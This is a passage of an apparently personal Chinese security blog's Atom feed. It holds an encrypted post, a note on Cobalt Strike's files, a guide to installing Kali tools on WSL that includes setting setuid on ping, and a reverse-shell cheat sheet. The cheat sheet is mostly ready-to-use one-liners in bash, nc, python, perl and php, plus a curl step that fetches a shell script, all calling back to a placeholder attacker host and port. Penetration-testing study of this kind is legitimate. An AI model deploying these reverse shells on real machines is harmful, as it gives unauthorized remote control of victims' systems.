zY0toG9M3FxYO0jdFTGzI0BCelXn6QHhWlDd8+vfYWOWnvcVEko/IKUQSkhbAB8rcE6e79xGz1AgNoqmQ3MnYLM2+Ut5CSfZFUTzmgSVxQeWDdf9PwIiWiP8wpJzMwZpo8GXREy+QRhWKyv3aqF1rFKd3E9ze7nJ/SmCxVIk/EAglkmD/uCtbjmO5f1bjZDFmPQ14mTITCQGGFu0GNG/r73FO0bNatuB4Rp9UBvtd2yc22EakmnMjFWnXM1I6P/9/t6Ou2+nokxbuHpNPmzAX0VmO0iZxgUv+RHHjSkZFJHwPsNLogfneWlpguzU1WPOW7hsPq+VMNKYsR5fwAnBjMUA+PI381nwMBRlGdFOMu6MX7stPj0+mNHyo0QRlSzlbLdWHAU33nKVQmqoO3eBABv29nfvwcvkrtBAz1jMdOZyOU91WgtJbEpzW78/Gny6iSTGGF7Po6W8H0oxvaRYW6QFp6ukGPCtMfugIIrWbDwrde/C4J+IHEANyNZMZiQ5WmK4SNprOnOH2lEuTLrebEpMQgGlpn3w83+z7C/siFqDHmmRosauI+AUUiDlwEaNsgC3B0gf1Jt6+/F3qYSzDZpMcB+8f7KQisZaQ+VG+8eNb7lqHQjt7xicKQklHX1rSho1woKxNa3vcJED13ooFi/yfF7SACZP0DVDprtyu515VXy6+wPKDk5RtVJtaqVFqkuZqPzVWHHFImXngDci6a4IoCn3nGYzICopVjh2xHzNOP21gwOlZF8O3IXWGakRZ04p2gS3JxLCaoZs+gPGoj+TK91dTtLIDwgxbna014DBAo6pN+WnqUMPqIqOHsj+lf4mYQgY16ku4ZV95wkehsYazD6uo9TYBcb1GmH1911ptfRPkF+PwuKL8lnHVJlvsIZWcslosUWCquUSeob6ONwz3vmes3z6e8WPETiYBmTYZ51IUoCrSqgZJ90dqQT6bOFRXCL1CE+Um85NdMBGQVkgsd2kXRNAR3xAwZpBEeR+zsPvhWtC+2vKLBh1wflIgz4wNc1IVYqV1SmOZ70j4If5KScZ4AUiTmpl84n9KCk/jQhd+OBYND/s0gsFBEPV3IdXCcwXxrSYLmUd6I7aQRwqfuoRlN8X2cqfrjK4ak3LBXY7RG9bf0HCGZ5TY4FU4xoHM9FVaKA+o0Gmxm7Kdz+HoViDEV659TXf6b2d7mgDBK43bQxX2HYb5CBzrseRjBdP4MH6smGcfmLRKAUZL64vI3vOgJ6PIJ7aTtrES/x+RAChxi7D5zjDQ9KsbKuNRgqnMFWQTzoSPL8egC3lgvYKcwvqOVZlRi37dz/VvqStAmVzFi+zs75va2cuucilCfsLvBl8KIH7N1+FgcqVtdh9ckTPgvPWYrUZLraDNGne/Ap72lFQ+DU2lfrGjImTQ5v6njrzQclLslDF6iKluSjdJ2+cO5JWFqelaqi600+WxEwDwIRXKCQW2ht32SP867LV/4RoBzss0ClQluw==</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-收到面试通知&quot;&gt;&lt;a href=&quot;#0x00-收到面试通知&quot; class=&quot;headerlink&quot; title=&quot;0x00 收到面试通知&quot;&gt;&lt;/a&gt;0x00 收到面试通知&lt;/h2&gt;&lt;p&gt;人生中总有许许多多的第一次，本菜鸡终于迎来了第一次面试。昨天晚上填写的申请，今天就收到了面试通知。效率还是很高的。心情很是复杂，不过不知为什么又有一种什么都不慌的感觉（可能是破罐破摔吧）&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="日常" scheme="https://sunny250.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike的使用</title>
    <link href="https://sunny250.github.io/2020/03/12/Cobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://sunny250.github.io/2020/03/12/Cobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-03-12T10:52:34.000Z</published>
    <updated>2020-03-12T10:52:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>目录文件介绍</p><blockquote><p>agscript拓展应用的脚本</p><p>c2lint 用于检查profile的错误异常</p></blockquote><a id="more"></a><blockquote><p>teamserver服务端程序</p><p>cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</p><p>logs目录记录与目标主机的相关信息</p><p>update，update.jar用于更新CS（盗版无法更新）</p><p>third-party第三方工具</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;目录文件介绍&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;agscript拓展应用的脚本&lt;/p&gt;
&lt;p&gt;c2lint 用于检查profile的错误异常&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="日常积累" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/"/>
    
    
      <category term="保持更新" scheme="https://sunny250.github.io/tags/%E4%BF%9D%E6%8C%81%E6%9B%B4%E6%96%B0/"/>
    
      <category term="工具使用" scheme="https://sunny250.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="待补充" scheme="https://sunny250.github.io/tags/%E5%BE%85%E8%A1%A5%E5%85%85/"/>
    
  </entry>
  
  <entry>
    <title>关于反弹shell的姿势</title>
    <link href="https://sunny250.github.io/2020/03/05/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
    <id>https://sunny250.github.io/2020/03/05/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%A7%BF%E5%8A%BF/</id>
    <published>2020-03-05T07:26:53.000Z</published>
    <updated>2020-03-05T07:26:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux下的反弹"><a href="#linux下的反弹" class="headerlink" title="linux下的反弹"></a>linux下的反弹</h2><p>本机使用nc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><blockquote><ul><li><p>linux shell下常用的文件描述符是：</p><blockquote><ol><li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p></li><li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p></li></ol></blockquote></li><li><p>bash -i 新开一个交互bash</p></li><li><p>&gt;&amp;或者 &amp;&gt;  将标准错误输出定向到标准输出中</p></li><li><p>0&gt;&amp;1或者0&lt;&amp;1将标准输入重定向到标准输出中</p></li><li><p>/dev/tcp/host/port  使用tcp通道与host:post建立一个连接</p></li><li><p>如果还是不清楚 参考手册<a href="https://www.gnu.org/software/bash/manual/bash.pdf" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/bash.pdf</a> 3.6 章redirections</p></li></ul></blockquote><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash host port</span><br></pre></td></tr></table></figure><blockquote><p>nc -e   inbound program to exec [dangerous!!]</p></blockquote><p>有些版本的NC没有-e选项，在本机开两个端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port1</span><br><span class="line">nc -lvp port2</span><br></pre></td></tr></table></figure><p>受控机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host port1 | &#x2F;bin&#x2F;bash | nc host port2</span><br></pre></td></tr></table></figure><blockquote><ul><li><p>管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出</p></li><li><p>将nc 改成telnet 也是可以的</p></li></ul></blockquote><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;host&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;host&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><blockquote><p>php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</p></blockquote><h3 id="使用外置bash连接"><a href="#使用外置bash连接" class="headerlink" title="使用外置bash连接"></a>使用外置bash连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip:port&#x2F;shell</span><br></pre></td></tr></table></figure><p>shell内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>参考连接</p><p><a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">https://www.freebuf.com/news/142195.html</a></p><p><a href="https://www.freebuf.com/articles/system/147768.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/147768.html</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178150.html</a></p><p><a href="https://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/153986.html</a></p><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;linux下的反弹&quot;&gt;&lt;a href=&quot;#linux下的反弹&quot; class=&quot;headerlink&quot; title=&quot;linux下的反弹&quot;&gt;&lt;/a&gt;linux下的反弹&lt;/h2&gt;&lt;p&gt;本机使用nc&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc -lvp port&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="日常积累" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/"/>
    
    
      <category term="shell" scheme="https://sunny250.github.io/tags/shell/"/>
    
      <category term="渗透测试" scheme="https://sunny250.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>win子系统安装kali工具记录</title>
    <link href="https://sunny250.github.io/2020/03/05/win%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85kali%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/03/05/win%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85kali%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-04T20:08:48.000Z</published>
    <updated>2020-03-04T20:08:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>win下的子系统kali默认是不带有Metasploit</p><p>如果是其他linux安装需要换源</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure><p>会自动选取最近的源服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>换好之后就是更新一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><p>下载需要的工具例如Matesploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><p>安装好之后需要初始化postgres数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb init</span><br></pre></td></tr></table></figure><p>安装ncat，sqlmap，nmap,aircrack-ng等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y insatll ncat</span><br><span class="line">sudo apt-get -y insatll sqlmap</span><br><span class="line">sudo apt-get -y insatll nmap</span><br><span class="line">sudo apt-get -y insatll aircrack-ng</span><br></pre></td></tr></table></figure><p>在安装完wireshark后运行报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sx@QAQ:~$ wireshark</span><br><span class="line">wireshark: error while loading shared libraries: libQt5Core.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>删除标签即可参考链接<a href="https://github.com/Microsoft/WSL/issues/3023" target="_blank" rel="noopener">https://github.com/Microsoft/WSL/issues/3023</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strip --remove-section&#x3D;.note.ABI-tag &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libQt5Core.so.5.12.5</span><br></pre></td></tr></table></figure><p>记录一下更改用户名以及家目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -l NewUser -d &#x2F;home&#x2F;NewUser -m OldUser</span><br></pre></td></tr></table></figure><p>直接ping host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping: socket: Operation not permitted</span><br></pre></td></tr></table></figure><p>sudo ping 后正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ping 1.1.1.1</span><br><span class="line">PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;191 ms</span><br><span class="line">64 bytes from 1.1.1.1: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;187 ms</span><br></pre></td></tr></table></figure><p>解决办法   chmod +s 就是给某个程序暂时root权限，运行后恢复正常权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ type ping</span><br><span class="line">ping is hashed (&#x2F;usr&#x2F;bin&#x2F;ping)</span><br><span class="line">$ sudo chmod +s &#x2F;usr&#x2F;bin&#x2F;ping</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;win下的子系统kali默认是不带有Metasploit&lt;/p&gt;
&lt;p&gt;如果是其他linux安装需要换源&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="工具安装" scheme="https://sunny250.github.io/tags/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
</feed>
